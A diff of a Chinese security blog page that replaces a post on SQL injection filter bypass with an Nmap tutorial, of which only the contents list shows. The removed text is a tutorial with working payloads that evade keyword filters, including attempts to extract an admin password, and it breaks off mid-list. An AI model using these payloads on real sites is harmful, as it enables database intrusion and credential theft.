@@ -43,7 +43,7 @@
     
     <title>
         
-            0x02 SQL注入绕过 | 
+            0x07 Nmap(1) | 
         
         张Mini
     </title>
@@ -54,7 +54,7 @@
 
     <meta name="format-detection" content="telephone=no"/>
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content="张Mini,SQL">
+    <meta name="keywords" content="张Mini,Nmap">
     <meta name="theme-color" content="#555555">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
@@ -220,7 +220,7 @@
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="application-name" content="张Mini">
-    <meta name="msapplication-starturl" content="http://alittlexyz.com/2018/05/24/2/">
+    <meta name="msapplication-starturl" content="http://alittlexyz.com/2018/05/28/7/">
     <meta name="msapplication-navbutton-color" content="#555555">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-title" content="张Mini">
@@ -235,16 +235,16 @@
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://alittlexyz.com/2018/05/24/2/">
+    <meta property="og:url" content="http://alittlexyz.com/2018/05/28/7/">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="0x02 SQL注入绕过 | 张Mini">
+    <meta property="og:title" content="0x07 Nmap(1) | 张Mini">
     <meta property="og:image" content="/img/favicon.png">
     <meta property="og:description" content="">
-    <meta property="og:article:tag" content="SQL"> 
+    <meta property="og:article:tag" content="Nmap"> 
 
     
-        <meta property="article:published_time" content="Thu May 24 2018 08:04:55 GMT+0800">
-        <meta property="article:modified_time" content="Fri May 25 2018 20:52:55 GMT+0800">
+        <meta property="article:published_time" content="Mon May 28 2018 10:32:35 GMT+0800">
+        <meta property="article:modified_time" content="Mon May 28 2018 16:42:39 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -252,7 +252,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://alittlexyz.com/2018/05/24/2/index.html" />
+        <link rel="canonical" href="http://alittlexyz.com/2018/05/28/7/index.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -264,10 +264,10 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "http://alittlexyz.com/2018/05/24/2/index.html",
-    "headline": "0x02 SQL注入绕过",
-    "datePublished": "Thu May 24 2018 08:04:55 GMT+0800",
-    "dateModified": "Fri May 25 2018 20:52:55 GMT+0800",
+    "mainEntityOfPage": "http://alittlexyz.com/2018/05/28/7/index.html",
+    "headline": "0x07 Nmap(1)",
+    "datePublished": "Mon May 28 2018 10:32:35 GMT+0800",
+    "dateModified": "Mon May 28 2018 16:42:39 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "张Mini",
@@ -285,7 +285,7 @@
             "url": "/img/favicon.png"
         }
     },
-    "keywords": ",SQL张Mini",
+    "keywords": ",Nmap张Mini",
     "description": "",
 }
 </script>
@@ -351,7 +351,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入绕过"><span class="post-toc-number">1.</span> <span class="post-toc-text">SQL注入绕过</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#使用空字节"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">使用空字节</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#大小写变种"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">大小写变种</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#注释绕过"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">注释绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#URL编码绕过"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">URL编码绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#引号绕过"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">引号绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#逗号绕过"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">逗号绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#比较符-lt-gt-绕过"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">比较符(&lt;,&gt;)绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#嵌套剥离后的表达式"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">嵌套剥离后的表达式</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#黑名单绕过"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">黑名单绕过</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-过滤关键字-and-or"><span class="post-toc-number">1.9.1.</span> <span class="post-toc-text">1. 过滤关键字: and,or</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-过滤关键字-and-or-union"><span class="post-toc-number">1.9.2.</span> <span class="post-toc-text">2. 过滤关键字: and or union</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-过滤关键字-and-or-union-where"><span class="post-toc-number">1.9.3.</span> <span class="post-toc-text">3. 过滤关键字 and or union where</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#4-过滤关键字-and-or-union-where-limit"><span class="post-toc-number">1.9.4.</span> <span class="post-toc-text">4. 过滤关键字: and or union where limit</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5-过滤关键字-and-or-union-where-limit-group-by"><span class="post-toc-number">1.9.5.</span> <span class="post-toc-text">5. 过滤关键字: and or union where limit group by</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#6-过滤关键字-and-or-union-where-limit-group-by-select"><span class="post-toc-number">1.9.6.</span> <span class="post-toc-text">6. 过滤关键字: and or union where limit group by select</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#7-过滤关键字-and-or-union-where-limit-group-by-select-‘"><span class="post-toc-number">1.9.7.</span> <span class="post-toc-text">7. 过滤关键字: and or union where limit group by select ‘</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#8-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex"><span class="post-toc-number">1.9.8.</span> <span class="post-toc-text">8. 过滤关键字: and or union where limit group by select ‘ hex</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#9-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr"><span class="post-toc-number">1.9.9.</span> <span class="post-toc-text">9. 过滤关键字:and or union where limit group by select ‘ hex substr</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#10-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr-空格"><span class="post-toc-number">1.9.10.</span> <span class="post-toc-text">10. 过滤关键字:  and or union where limit group by select ‘ hex substr 空格</span></a></li></ol></li></ol></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">1.</span> <span class="post-toc-text">Nmap</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap介绍"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">Nmap介绍</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap基本用法"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">Nmap基本用法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#简单的扫描"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">简单的扫描</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Ping扫描-sP"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">Ping扫描(-sP)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#无Ping扫描-P0"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">无Ping扫描(-P0)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#TCP-STN-Ping扫描-PS"><span class="post-toc-number">1.2.4.</span> <span class="post-toc-text">TCP STN Ping扫描(-PS)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#TCP-ACK-Ping扫描-PA"><span class="post-toc-number">1.2.5.</span> <span class="post-toc-text">TCP ACK Ping扫描(-PA)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#UDP-Ping扫描-PU"><span class="post-toc-number">1.2.6.</span> <span class="post-toc-text">UDP Ping扫描(-PU)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ICMP-Ping-Types扫描-PE-PP-PM"><span class="post-toc-number">1.2.7.</span> <span class="post-toc-text">ICMP Ping Types扫描(-PE;-PP;-PM)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#PE"><span class="post-toc-number">1.2.7.1.</span> <span class="post-toc-text">-PE</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#PP"><span class="post-toc-number">1.2.7.2.</span> <span class="post-toc-text">-PP</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#PM"><span class="post-toc-number">1.2.7.3.</span> <span class="post-toc-text">-PM</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ARP-Ping扫描-PR"><span class="post-toc-number">1.2.8.</span> <span class="post-toc-text">ARP Ping扫描(-PR)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#扫描列表-sL"><span class="post-toc-number">1.2.9.</span> <span class="post-toc-text">扫描列表(-sL)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#禁止反向域名解析-n"><span class="post-toc-number">1.2.10.</span> <span class="post-toc-text">禁止反向域名解析(-n)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#反向域名解析-R"><span class="post-toc-number">1.2.11.</span> <span class="post-toc-text">反向域名解析(-R)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用系统域名解析器-–system-dns"><span class="post-toc-number">1.2.12.</span> <span class="post-toc-text">使用系统域名解析器(–system-dns)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#扫描一个IPV6地址-6"><span class="post-toc-number">1.2.13.</span> <span class="post-toc-text">扫描一个IPV6地址(-6)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#路由跟踪-–traceroute"><span class="post-toc-number">1.2.14.</span> <span class="post-toc-text">路由跟踪(–traceroute)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SCTP-INIT-Ping扫描"><span class="post-toc-number">1.2.15.</span> <span class="post-toc-text">SCTP INIT Ping扫描</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#时序选择-T"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">时序选择(-T)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#常用扫描方式-p-F"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">常用扫描方式(-p|-F)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#p"><span class="post-toc-number">1.3.2.1.</span> <span class="post-toc-text">-p</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#F"><span class="post-toc-number">1.3.2.2.</span> <span class="post-toc-text">-F</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#r"><span class="post-toc-number">1.3.2.3.</span> <span class="post-toc-text">-r</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#–top-ports"><span class="post-toc-number">1.3.2.4.</span> <span class="post-toc-text">–top-ports</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#–port-ratio"><span class="post-toc-number">1.3.2.5.</span> <span class="post-toc-text">–port-ratio</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#TCP-SYN扫描-sS"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">TCP SYN扫描(-sS)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#TCP连接扫描-sT"><span class="post-toc-number">1.3.4.</span> <span class="post-toc-text">TCP连接扫描(-sT)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#UDP扫描-sU"><span class="post-toc-number">1.3.5.</span> <span class="post-toc-text">UDP扫描(-sU)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#隐蔽扫描-sN-sF-sX"><span class="post-toc-number">1.3.6.</span> <span class="post-toc-text">隐蔽扫描(-sN;-sF;-sX)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#sN"><span class="post-toc-number">1.3.6.1.</span> <span class="post-toc-text">-sN</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#sF"><span class="post-toc-number">1.3.6.2.</span> <span class="post-toc-text">-sF</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#sX"><span class="post-toc-number">1.3.6.3.</span> <span class="post-toc-text">-sX</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#TCP-ACK扫描-sA"><span class="post-toc-number">1.3.7.</span> <span class="post-toc-text">TCP ACK扫描(-sA)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#TCP窗口扫描-sW"><span class="post-toc-number">1.3.8.</span> <span class="post-toc-text">TCP窗口扫描(-sW)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#自定义TCP扫描-–scanflags"><span class="post-toc-number">1.3.9.</span> <span class="post-toc-text">自定义TCP扫描(–scanflags)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#空闲扫描-sI"><span class="post-toc-number">1.3.10.</span> <span class="post-toc-text">空闲扫描(-sI)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#IP协议扫描-sO"><span class="post-toc-number">1.3.11.</span> <span class="post-toc-text">IP协议扫描(-sO)</span></a></li></ol></li></ol></li></ol>
     </ul>
     
 
@@ -383,7 +383,7 @@
         
     
             <p class="article-headline-p">
-                0x02 SQL注入绕过
+                0x07 Nmap(1)
             </p>
         </div>
 
@@ -402,7 +402,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>张Mini</strong>
-        <span>May 24, 2018</span>
+        <span>May 28, 2018</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -424,7 +424,7 @@
 <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
     <li class="mdl-menu__item">Read this article on other devices</li>
     
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACZUlEQVR42u3aQZICIQwFUO9/6ZkDWLY/CWBrvV5ZNUrzWEDmk8ffTz8PPDw8PDw8PDy8m/Ee8fP8/edx3rz4xW9fjVCdGx4eHt5JXjKtZIqT70+WDA8PD+9TvOvDIJ/Q9dZ/Pf7152hueHh4eDfjFUrbAH99hODh4eH9Bi/f7q83+rwcx8PDw7szr/APfxGcRBLz5cDDw8M7yategJ38/IH7PTw8PLxLXvXpRb1J2Z0fHm9miIeHh7eZlwSpvRcnxXGyQNWmBDw8PLzdvGrEMNn6k0XsvREPDw/vJC9/TXWj7y3QZOHw8PDwTvKSzbpa/uZLlo+Mh4eHdwdeNbTNj4cc1gtEFlyA4eHh4W3g9ULVaqyQl+/R4uLh4eFt5lWL2uS3vRi3upSF1gE8PDy8DbxesTuJFdbGwXh4eHif4vU28WohnlxxTdq/8PDw8M7w5m2pk1hhHu/i4eHhneftiFaTX+Whw+IwAg8PD2/AS7b4SUPApFxOjqtC6wAeHh7eIt6qtqfeZVh+YCR/xcPDw7sDLw8mJht6byEWHAx4eHh4LV4+3Wq7wKoYorp8eHh4eGd4hZC0FfvmLQWTABcPDw/vDC/Zvqvxbn6QVCPgqGUBDw8PbzOv+uRhbt6CkGz9hW/i4eHhbeZNrvmTFyej5eMkRTkeHh7eGd480p00GeRNA9F88PDw8A7yku17chisCiPw8PDwvos3aa7qjZAEx3h4eHjfyKsGr3kpn78RDw8P7zyv1yAVXecXy/RCaLs2a8HDw8OLecuCgGBy1di3utx4eHh4u3m/9+Dh4eHh4eHh4d3g+Qcp3Aw3uxpY8AAAAABJRU5ErkJggg==">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACZklEQVR42u3aQRLCIAwF0N7/0noAR/wJlDLOY+VC274uSPzkev31uvDw8PDw8PDw8A7jXfH6/P7ndX7c+Mtvv12h+mx4eHh4O3nJY40/j78/vsv8K8PDw8N7ijcuBtWtfMxIXlnv2fDw8PBO4xVa2wA/LiF4eHh4/8HLt/u8Bc/bdzw8PLzTeIU//AEjKR45b1PWgoeHhxfzqgdgOz8/cL6Hh4eHN+RVV77dV2OLvHj8eEI8PDy8m3lJkNq7cW/IoNe44+Hh4e3k5cFEdZy09xJ7d8TDw8PbycsDiN4YVvVxFwwo4OHh4d3M6z1ccptk049GAaptNx4eHt7NvF4I2xstTdriPBApZy14eHh4i3i9+HVtrJBcMy9jeHh4eHfzksOt3lBUNcbtxRZ4eHh4T/HyTb9aJPJRgJk4GA8PD+9ZXrL1v+K1NuxYUBjw8PDwpnk9Rh5AjNvxVfEuHh4e3gm8XuRa5eWDAoXmHg8PD28Lr/pAefQw0y4nhao8U4aHh4e3iFcdn7qKqxd/9Fp/PDw8vLt5eUPcO6ZKNvTei4gKAx4eHt4NvCSS6I2lrooh8nKFh4eHt5OXjwVUG+6ZolINcPHw8PD28Gb+9veO0HqBb+FYDg8PD+9mXnXlw1W9b/YGEfDw8PB28qqbcu9ov3q1ajyBh4eHt583E0DMjBrMHJhNne/h4eHhLeIl23f1yKoK6xUnPDw8vJN5vULSGwJoRsZ4eHh4B/PyGGLmNZWHEvDw8PA28vJDr5nRgbwFz0cc8PDw8Pbz5g/AkqGBainKSXh4eHg7ef+38PDw8PDw8PDwDlhvQXxT7/274AMAAAAASUVORK5CYII=">
     
 </ul>
 
@@ -438,7 +438,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/SQL/">SQL</a>
+        <a class="post_tag-link" href="/tags/Nmap/">Nmap</a>
     </ul>
     
 
@@ -455,7 +455,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=0x02 SQL注入绕过&url=http://alittlexyz.com/2018/05/24/2/index.html&pic=http://alittlexyz.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=0x07 Nmap(1)&url=http://alittlexyz.com/2018/05/28/7/index.html&pic=http://alittlexyz.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 Share to Weibo
             </li>
@@ -476,7 +476,7 @@
 
     <!-- Share QQ -->
     
-        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=张Mini&title=0x02 SQL注入绕过&summary=&pics=http://alittlexyz.com/img/favicon.png&url=http://alittlexyz.com/2018/05/24/2/index.html" target="_blank">
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=张Mini&title=0x07 Nmap(1)&summary=&pics=http://alittlexyz.com/img/favicon.png&url=http://alittlexyz.com/2018/05/28/7/index.html" target="_blank">
             <li class="mdl-menu__item">
                 Share to QQ
             </li>
@@ -495,134 +495,91 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h1 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h1><hr>
-<h2 id="使用空字节"><a href="#使用空字节" class="headerlink" title="使用空字节"></a>使用空字节</h2><p>要想执行空字节攻击，只需在过滤器阻止的字符前面提供一个采用URL编码的空字节即可</p>
-<pre><code class="sql">%00&#39; union select password from tblUsers where username=&#39;admin&#39; --+
-</code></pre>
-<h2 id="大小写变种"><a href="#大小写变种" class="headerlink" title="大小写变种"></a>大小写变种</h2><p>如果某些关键字过滤器不够聪明，可以使用变换攻击字符串中字符的大小来避开</p>
-<pre><code class="sql">&#39;uNiOn SeLeCt password frOm tblUsers WhErE usermane=&quot;admin&quot; --+
-</code></pre>
-<h2 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h2><p>使用内联注释序列创建SQL代码段</p>
-<pre><code class="sql">&#39;/**/union/**/select/**/password/**/from/**/tblusers/**/where/**/username/**/like/**/&#39;admin&#39; --+ 
-</code></pre>
-<h2 id="URL编码绕过"><a href="#URL编码绕过" class="headerlink" title="URL编码绕过"></a>URL编码绕过</h2><p>2007年PHP-Nuke发现有一个漏洞所使用的过滤器能阻止空白符和内敛注释/* ，但无法阻止以注释序列所表示的URL编码</p>
-<pre><code class="sql">&#39;%2f%2a*/union%2f%2a*/select%2f%2a*/password%2f%2a*/from%2f%2a*/tblusers%2f%2a*/where%2f%2a*/username%2f%2a*/like%2f%2a*/&#39;admin&#39;--+ 
-</code></pre>
-<p>这种基本的URL编码攻击对其他情况不起作用，不过仍可以通过对被阻止的字符进行双URL编码来避开过滤器</p>
-<pre><code class="sql">&#39;%252f%252a*/union%252f%252a*/select%252f%252a*/password%252f%252a*/from%252f%252a*/tblusers%252f%252a*/where%252f%252a*/username%252f%252a*/like%252f%252a*/&#39;admin&#39;--+ 
-</code></pre>
-<p>双url编码有时会起作用</p>
-<h2 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h2><pre><code class="sql">select table_name from information_schema.tables where table_schema=&quot;example&quot;
-</code></pre>
-<p>如果引号被过滤是没办法进行过滤的，这时候可以转换为十六进制</p>
-<h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><p>在使用盲注的时候，需要使用到 substr() ,mid(),limit。这些子句方法都需要使用到逗号。对于 substr() 和mid()这两个方法可以使用from to的方式来解决</p>
-<pre><code class="sql">select substr(database(0 from 1 to 1);
-select mid(database(0 from 1 to 1);
-</code></pre>
-<p>对于limit可以使用offset绕过</p>
-<pre><code class="sql">select * from news limit 0,1
-# 等价于下面这条SQL语句
-select * from news limit 1 offset 0
-</code></pre>
-<h2 id="比较符-lt-gt-绕过"><a href="#比较符-lt-gt-绕过" class="headerlink" title="比较符(&lt;,&gt;)绕过"></a>比较符(&lt;,&gt;)绕过</h2><p>如果无法使用比较操作符，那么就需要使用greatest来进行过滤</p>
-<pre><code class="sql">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64
-</code></pre>
-<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。</p>
-<pre><code class="sql">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
-</code></pre>
-<h2 id="嵌套剥离后的表达式"><a href="#嵌套剥离后的表达式" class="headerlink" title="嵌套剥离后的表达式"></a>嵌套剥离后的表达式</h2><p>有些审查过滤器会先从用户输入中剥离特定的字符或表达式，然后在按照常用的方式处理剩下的数据。如果被剥离的表达式中包含两个或以上的字符，就不会递归应用过滤器。通常可以通过在禁止的表达式中嵌套自身来绕过过滤器</p>
-<pre><code class="sql">selectselect
-</code></pre>
-<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h3 id="1-过滤关键字-and-or"><a href="#1-过滤关键字-and-or" class="headerlink" title="1. 过滤关键字: and,or"></a>1. 过滤关键字: and,or</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or)/i&#39;,$id)
-</code></pre>
-<p>会过滤的代码</p>
-<pre><code class="sql">1 or 1=1 1 and 1=1
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 || 1=1 1 &amp;&amp; 1=1
-</code></pre>
-<p>下面这种方式你需要先知道一些表和字段名</p>
-<h3 id="2-过滤关键字-and-or-union"><a href="#2-过滤关键字-and-or-union" class="headerlink" title="2. 过滤关键字: and or union"></a>2. 过滤关键字: and or union</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union)/i&#39;,$id)
-</code></pre>
-<p>会过滤的代码</p>
-<pre><code class="sql">union select user,password from users
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; (select user from users where user_id=1)=&#39;admin&#39;
-</code></pre>
-<h3 id="3-过滤关键字-and-or-union-where"><a href="#3-过滤关键字-and-or-union-where" class="headerlink" title="3. 过滤关键字 and or union where"></a>3. 过滤关键字 and or union where</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union)/i&#39;,$id)
-</code></pre>
-<p>会过滤的代码</p>
-<pre><code class="sql">1 &amp;&amp; (select user from users where user_id = 1) = &#39;admin&#39;
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; (select user from users limit 1) = &#39;admin&#39;
-</code></pre>
-<h3 id="4-过滤关键字-and-or-union-where-limit"><a href="#4-过滤关键字-and-or-union-where-limit" class="headerlink" title="4. 过滤关键字: and or union where limit"></a>4. 过滤关键字: and or union where limit</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit)/i&#39;, $id)
-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; (select user from users limit 1) = &#39;admin&#39;
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &#39;admin&#39;     #user_id聚合中user_id为1的user为admin
-</code></pre>
-<h3 id="5-过滤关键字-and-or-union-where-limit-group-by"><a href="#5-过滤关键字-and-or-union-where-limit-group-by" class="headerlink" title="5. 过滤关键字: and or union where limit group by"></a>5. 过滤关键字: and or union where limit group by</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit|group by)/i&#39;, $id)
-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &#39;admin&#39;
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1
-</code></pre>
-<h3 id="6-过滤关键字-and-or-union-where-limit-group-by-select"><a href="#6-过滤关键字-and-or-union-where-limit-group-by-select" class="headerlink" title="6. 过滤关键字: and or union where limit group by select"></a>6. 过滤关键字: and or union where limit group by select</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit|group by|select)/i&#39;, $id)
-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; substr(user,1,1) = &#39;a&#39;
-</code></pre>
-<h3 id="7-过滤关键字-and-or-union-where-limit-group-by-select-‘"><a href="#7-过滤关键字-and-or-union-where-limit-group-by-select-‘" class="headerlink" title="7. 过滤关键字: and or union where limit group by select ‘"></a>7. 过滤关键字: and or union where limit group by select ‘</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit|group by|select|\&#39;)/i&#39;, $id)
-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)
-</code></pre>
-<h3 id="8-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex"><a href="#8-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex" class="headerlink" title="8. 过滤关键字: and or union where limit group by select ‘ hex"></a>8. 过滤关键字: and or union where limit group by select ‘ hex</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit|group by|select|\&#39;|hex)/i&#39;, $id)
-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; substr(user,1,1) = unhex(61)
-</code></pre>
-<p>绕过方式</p>
-<pre><code>1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。
-</code></pre><h3 id="9-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr"><a href="#9-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr" class="headerlink" title="9. 过滤关键字:and or union where limit group by select ‘ hex substr"></a>9. 过滤关键字:and or union where limit group by select ‘ hex substr</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit|group by|select|\&#39;|hex|substr)/i&#39;, $id)
